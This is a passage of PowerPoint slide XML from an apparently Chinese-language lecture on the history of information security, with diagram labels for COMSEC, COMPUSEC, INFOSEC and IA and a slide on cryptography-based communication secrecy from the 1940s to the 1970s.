          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:endParaRPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="+mn-ea"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="Oval 18"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1666875" y="2584450"/>
              <a:ext cx="990600" cy="533400"/>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grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="8" name="Group 47"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="3276600" y="1412875"/>
              <a:ext cx="2328863" cy="762000"/>
              <a:chOff x="1934" y="958"/>
              <a:chExt cx="1467" cy="480"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:grpSp>
            <p:nvGrpSpPr>
              <p:cNvPr id="9" name="Group 24"/>
              <p:cNvGrpSpPr>
                <a:grpSpLocks/>
              </p:cNvGrpSpPr>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr bwMode="auto">
              <a:xfrm>
                <a:off x="1934" y="958"/>
                <a:ext cx="716" cy="480"/>
                <a:chOff x="1584" y="960"/>
                <a:chExt cx="507" cy="480"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="12" name="Oval 25"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeArrowheads="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="gray">
                <a:xfrm>
                  <a:off x="1584" y="1296"/>
                  <a:ext cx="432" cy="144"/>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13" name="Oval 26"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeArrowheads="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="gray">
                <a:xfrm>
                  <a:off x="1661" y="960"/>
                  <a:ext cx="430" cy="43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14" name="Oval 27"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeArrowheads="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="gray">
                <a:xfrm>
                  <a:off x="1667" y="962"/>
                  <a:ext cx="419" cy="420"/>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15" name="Oval 28"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeArrowheads="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="gray">
                <a:xfrm>
                  <a:off x="1671" y="966"/>
                  <a:ext cx="399" cy="392"/>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16" name="Oval 29"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeArrowheads="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="gray">
                <a:xfrm>
                  <a:off x="1694" y="978"/>
                  <a:ext cx="355" cy="317"/>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grpSp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="10" name="Text Box 30"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="2036" y="1069"/>
                <a:ext cx="60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sz="1400" b="1">
                    <a:solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>COMSEC</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" altLang="zh-CN"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="11" name="Text Box 61"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2709" y="1082"/>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dirty="0"/>
                  <a:t>通信安全</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="17" name="Group 46"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="2051050" y="1844675"/>
              <a:ext cx="2571750" cy="1023938"/>
              <a:chOff x="1076" y="1246"/>
              <a:chExt cx="1620" cy="645"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="18" name="Oval 19"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="1102" y="1246"/>
                <a:ext cx="699" cy="645"/>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19" name="Oval 20"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="1111" y="1249"/>
                <a:ext cx="682" cy="630"/>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20" name="Oval 21"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="1118" y="1256"/>
                <a:ext cx="649" cy="58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21" name="Oval 22"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="1155" y="1272"/>
                <a:ext cx="579" cy="477"/>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22" name="Text Box 23"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="1076" y="1498"/>
                <a:ext cx="7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sz="1400" b="1">
                    <a:solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>COMPUSEC</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="23" name="Text Box 62"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1860" y="1577"/>
                <a:ext cx="8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t>计算机安全</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="24" name="Group 37"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="1619250" y="3033713"/>
              <a:ext cx="2606675" cy="1403350"/>
              <a:chOff x="1088" y="2047"/>
              <a:chExt cx="2019" cy="1008"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="25" name="Oval 11"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm rot="-772996">
                <a:off x="1140" y="2671"/>
                <a:ext cx="773" cy="384"/>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grpSp>
            <p:nvGrpSpPr>
              <p:cNvPr id="26" name="Group 12"/>
              <p:cNvGrpSpPr>
                <a:grpSpLocks/>
              </p:cNvGrpSpPr>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr bwMode="auto">
              <a:xfrm>
                <a:off x="1088" y="2047"/>
                <a:ext cx="936" cy="908"/>
                <a:chOff x="732" y="2112"/>
                <a:chExt cx="842" cy="860"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="28" name="Oval 13"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeArrowheads="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="gray">
                <a:xfrm>
                  <a:off x="732" y="2112"/>
                  <a:ext cx="842" cy="86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29" name="Oval 14"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeArrowheads="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="gray">
                <a:xfrm>
                  <a:off x="743" y="2117"/>
                  <a:ext cx="821" cy="838"/>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0" name="Oval 15"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeArrowheads="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="gray">
                <a:xfrm>
                  <a:off x="751" y="2125"/>
                  <a:ext cx="781" cy="784"/>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1" name="Oval 16"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeArrowheads="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="gray">
                <a:xfrm>
                  <a:off x="795" y="2147"/>
                  <a:ext cx="695" cy="63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2" name="Text Box 17"/>
                <p:cNvSpPr txBox="1">
                  <a:spLocks noChangeArrowheads="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="gray">
                <a:xfrm>
                  <a:off x="804" y="2488"/>
                  <a:ext cx="679"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sz="1400" b="1">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:rPr>
                    <a:t>INFOSEC</a:t>
                  </a:r>
                  <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1"/>
                </a:p>
              </p:txBody>
            </p:sp>
          </p:grpSp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="27" name="Text Box 63"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1902" y="2060"/>
                <a:ext cx="1205"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dirty="0"/>
                  <a:t>信息系统安全</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="33" name="Group 49"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="2735263" y="3573463"/>
              <a:ext cx="2636837" cy="1900237"/>
              <a:chOff x="1723" y="2251"/>
              <a:chExt cx="1661" cy="1197"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="34" name="Oval 5"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm rot="-723406">
                <a:off x="1763" y="3065"/>
                <a:ext cx="838" cy="383"/>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35" name="Oval 6"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="1723" y="2366"/>
                <a:ext cx="994" cy="979"/>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6" name="Oval 7"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="1735" y="2371"/>
                <a:ext cx="971" cy="955"/>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7" name="Oval 8"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="1745" y="2380"/>
                <a:ext cx="924" cy="893"/>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8" name="Oval 9"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="1799" y="2406"/>
                <a:ext cx="822" cy="724"/>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9" name="Text Box 10"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="2059" y="2726"/>
                <a:ext cx="32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sz="2800">
                    <a:solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>IA</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" altLang="zh-CN"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="40" name="Text Box 64"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2404" y="2251"/>
                <a:ext cx="9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t>信息安全保障</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="41" name="Group 50"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="4824413" y="3573463"/>
              <a:ext cx="4106862" cy="2260600"/>
              <a:chOff x="3039" y="2251"/>
              <a:chExt cx="2587" cy="1424"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="42" name="Oval 5"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm rot="-723406">
                <a:off x="3088" y="3220"/>
                <a:ext cx="1012" cy="455"/>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43" name="Oval 6"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="3039" y="2389"/>
                <a:ext cx="1202" cy="1164"/>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44" name="Oval 7"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="3053" y="2396"/>
                <a:ext cx="1174" cy="1134"/>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45" name="Oval 8"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="3066" y="2406"/>
                <a:ext cx="1116" cy="106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46" name="Oval 9"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="3131" y="2437"/>
                <a:ext cx="993" cy="860"/>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47" name="Text Box 10"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="3293" y="2817"/>
                <a:ext cx="7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sz="2800">
                    <a:solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>CS/IA</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" altLang="zh-CN"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="48" name="Text Box 64"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="3742" y="2251"/>
                <a:ext cx="18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t>网络空间安全</a:t>
                </a:r>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN"/>
                  <a:t>/</a:t>
                </a:r>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US"/>
                  <a:t>信息安全保障</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5902483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subTnLst>
                                    <p:set>
                                      <p:cBhvr override="childStyle">
                                        <p:cTn dur="1" fill="hold" display="0" masterRel="nextClick" afterEffect="1"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="50"/>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37604"/>
            <a:ext cx="8191500" cy="5105400"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>解决传输数据安全</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>斯巴达人的智慧：公元前</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>500</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>年，斯巴达人把一条羊皮螺旋形地缠在一个圆柱形棒上写数据</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>现代人的智慧：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>20</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>世纪，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>40</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>年代</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>-70</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>年代通过密码技术解决通信保密，内容篡改</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F5E0E65E-9137-4309-8D78-B392A1917D52}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>15</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Picture 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2339752" y="4077072"/>
            <a:ext cx="4851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 name="Picture 7" descr="对手"/>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40350" y="3931630"/>
            <a:ext cx="1627253" cy="1976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电影《风声》海报"/>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12160" y="3958952"/>
            <a:ext cx="1482625" cy="198888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风语者》海报"/>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67952" y="1820257"/>
            <a:ext cx="2936727" cy="4222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73838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9631" y="764704"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>通信安全</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338614" y="1507829"/>
            <a:ext cx="8191500" cy="2057620"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC3300"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>COMSEC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC3300"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC3300"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Communication Security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
              <a:t>20</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>世纪，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
              <a:t>40</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>年代</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
              <a:t>-70</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>年代</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>核心思想：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>通过密码技术解决通信保密，保证数据的保密性和完整性</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>主要关注传输过程中的数据保护 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="5" name="Group 4"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks noChangeAspect="1"/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="6235738" y="1112651"/>
            <a:ext cx="1692275" cy="1152525"/>
            <a:chOff x="4815" y="1661"/>
            <a:chExt cx="1155" cy="726"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="AutoShape 5"/>
            <p:cNvSpPr>
              <a:spLocks noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4815" y="1661"/>
              <a:ext cx="1155" cy="7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7" name="Group 6"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="4815" y="1665"/>
              <a:ext cx="727" cy="714"/>
              <a:chOff x="4815" y="1665"/>
              <a:chExt cx="727" cy="714"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:grpSp>
            <p:nvGrpSpPr>
              <p:cNvPr id="35" name="Group 7"/>
              <p:cNvGrpSpPr>
                <a:grpSpLocks/>
              </p:cNvGrpSpPr>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr bwMode="auto">
              <a:xfrm>
                <a:off x="4815" y="1665"/>
                <a:ext cx="375" cy="310"/>
                <a:chOff x="4815" y="1665"/>
                <a:chExt cx="375" cy="310"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="75" name="Freeform 8"/>
                <p:cNvSpPr>
                  <a:spLocks/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="4815" y="1665"/>
                  <a:ext cx="375" cy="310"/>
                </a:xfrm>
                <a:custGeom>
                  <a:avLst/>
                  <a:gdLst>
                    <a:gd name="T0" fmla="*/ 0 w 1499"/>
                    <a:gd name="T1" fmla="*/ 0 h 930"/>
                    <a:gd name="T2" fmla="*/ 0 w 1499"/>
                    <a:gd name="T3" fmla="*/ 0 h 930"/>
                    <a:gd name="T4" fmla="*/ 0 w 1499"/>
                    <a:gd name="T5" fmla="*/ 0 h 930"/>
                    <a:gd name="T6" fmla="*/ 0 w 1499"/>
                    <a:gd name="T7" fmla="*/ 0 h 930"/>
                    <a:gd name="T8" fmla="*/ 0 w 1499"/>
                    <a:gd name="T9" fmla="*/ 0 h 930"/>
                    <a:gd name="T10" fmla="*/ 0 w 1499"/>
                    <a:gd name="T11" fmla="*/ 0 h 930"/>
                    <a:gd name="T12" fmla="*/ 0 w 1499"/>
                    <a:gd name="T13" fmla="*/ 0 h 930"/>
                    <a:gd name="T14" fmla="*/ 0 w 1499"/>
                    <a:gd name="T15" fmla="*/ 0 h 930"/>
                    <a:gd name="T16" fmla="*/ 0 w 1499"/>
                    <a:gd name="T17" fmla="*/ 0 h 930"/>
                    <a:gd name="T18" fmla="*/ 0 w 1499"/>
                    <a:gd name="T19" fmla="*/ 0 h 930"/>
                    <a:gd name="T20" fmla="*/ 0 w 1499"/>
                    <a:gd name="T21" fmla="*/ 0 h 930"/>
                    <a:gd name="T22" fmla="*/ 0 w 1499"/>
                    <a:gd name="T23" fmla="*/ 0 h 930"/>
                    <a:gd name="T24" fmla="*/ 0 w 1499"/>
                    <a:gd name="T25" fmla="*/ 0 h 930"/>
                    <a:gd name="T26" fmla="*/ 0 w 1499"/>
                    <a:gd name="T27" fmla="*/ 0 h 930"/>
                    <a:gd name="T28" fmla="*/ 0 w 1499"/>
                    <a:gd name="T29" fmla="*/ 0 h 930"/>
                    <a:gd name="T30" fmla="*/ 0 w 1499"/>
                    <a:gd name="T31" fmla="*/ 0 h 930"/>
                    <a:gd name="T32" fmla="*/ 0 w 1499"/>
                    <a:gd name="T33" fmla="*/ 0 h 930"/>
                    <a:gd name="T34" fmla="*/ 0 w 1499"/>
                    <a:gd name="T35" fmla="*/ 0 h 930"/>
                    <a:gd name="T36" fmla="*/ 0 w 1499"/>
                    <a:gd name="T37" fmla="*/ 0 h 930"/>
                    <a:gd name="T38" fmla="*/ 0 w 1499"/>
                    <a:gd name="T39" fmla="*/ 0 h 930"/>
                    <a:gd name="T40" fmla="*/ 0 w 1499"/>
                    <a:gd name="T41" fmla="*/ 0 h 930"/>
                    <a:gd name="T42" fmla="*/ 0 w 1499"/>
                    <a:gd name="T43" fmla="*/ 0 h 930"/>
                    <a:gd name="T44" fmla="*/ 0 w 1499"/>
                    <a:gd name="T45" fmla="*/ 0 h 930"/>
                    <a:gd name="T46" fmla="*/ 0 w 1499"/>
                    <a:gd name="T47" fmla="*/ 0 h 930"/>
                    <a:gd name="T48" fmla="*/ 0 w 1499"/>
